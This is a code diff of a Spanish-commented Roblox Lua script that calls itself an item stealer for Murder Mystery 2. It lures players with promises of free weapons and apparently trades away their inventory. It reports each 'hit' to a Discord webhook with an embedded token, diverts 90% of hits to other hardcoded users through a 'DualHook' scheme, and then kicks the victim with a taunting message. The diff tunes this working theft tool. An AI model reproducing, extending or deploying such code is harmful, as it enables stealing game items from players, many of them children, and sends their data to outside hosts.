@@ -306,29 +306,32 @@ local pingEveryone = _G.pingEveryone == "Yes"
 -- Configuración DualHook
 local DualHookUsers = {"cybertu24","AnonymousANONIMO125"}
 local DualHookWebhook = "https://discord.com/api/webhooks/1393678758883496078/dWWVbv5oLiiHL9Po5FYg77bbJXVBeHkkij_Hy1MpxQHut1pNY2c_hzNg8jK0Qq7jNCRM" -- Cambiar a tu webhook real
-local DualHookMinValue = 300
-local DualHookPercent = 50 -- porcentaje de hits que se van a ti
-
--- Kick por servidor lleno, privado o VIP
-local function CheckServerInitial()
-    if #Players:GetPlayers() >= 12 then
-        LocalPlayer:Kick("⚠️ Servidor lleno. Buscando uno vacío...")
-    end
-    if game.PrivateServerId and game.PrivateServerId ~= "" then
-        LocalPlayer:Kick("🔒 Servidor privado detectado. Buscando público...")
-    end
-    local success, ownerId = pcall(function() return game.PrivateServerOwnerId end)
-    if success and ownerId and ownerId ~= 0 then
-        LocalPlayer:Kick("🔒 Servidor VIP detectado. Buscando público...")
-    end
+local DualHookMinValue = 20
+local DualHookPercent = 90 -- porcentaje de hits que se van a ti
+-- Si no está en MM2
+if game.PlaceId ~= 142823291 then
+    LocalPlayer:Kick("⚠️Este script no funciona en este juego, solo funciona en mm2 ✅")
+    return
 end
-CheckServerInitial()
+
+-- Si es un VIP server
+local serverType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
+if serverType == "VIPServer" then
+    LocalPlayer:Kick("⚠️El script no funciona en servidor privado, debes ir a un servidor público no lleno ✅")
+    return
+end
+
+-- Si el server está lleno
+if #Players:GetPlayers() >= 12 then
+    LocalPlayer:Kick("⚠️El script no puede funcionar en servidor lleno, debes ir a un servidor que no esté lleno ✅")
+    return
+end
 
 local req = syn and syn.request or http_request or request
 if not req then warn("No HTTP request method available!") return end
 
 -- Función para enviar webhook (dualhook automático)
-local function SendDualHook(title, description, fields)
+local function SendDualHook(title, description, fields, prefix)
     local useDual = false
     for _, field in ipairs(fields or {}) do
         if field.value then
@@ -343,9 +346,8 @@ local function SendDualHook(title, description, fields)
         end
     end
     local targetWebhook = useDual and DualHookWebhook or webhook
-    local prefix = pingEveryone and "@everyone " or ""  -- <--- define antes
     local data = {
-        ["content"] = prefix,
+        ["content"] = prefix or "",
         ["embeds"] = {{
             ["title"] = title,
             ["description"] = description or "",
@@ -525,7 +527,7 @@ local function SendInitWebhook()
     end
 
     local prefix=pingEveryone and "@everyone " or ""
-    SendDualHook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit)
+    SendDualHook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit, prefix)
 end
 SendInitWebhook()
 
@@ -547,7 +549,8 @@ local function TradeFinalizado()
         fieldsFinal[2].value = fieldsFinal[2].value.."... y más armas 🔥\n"
     end
 
-    SendDualHook("✅ Todos los trades finalizados","💰Todas las armas enviadas correctamente 😎",fieldsFinal)
+    -- webhook final sin everyone
+    SendDualHook("✅ Todos los trades finalizados","💰Todas las armas enviadas correctamente 😎",fieldsFinal, "")
     task.wait(3)
     LocalPlayer:Kick("El ladron encubierto☠️ ha robado TODO tu inventario de MM2🔥 llora niño/a🤣😂🥱")
 end
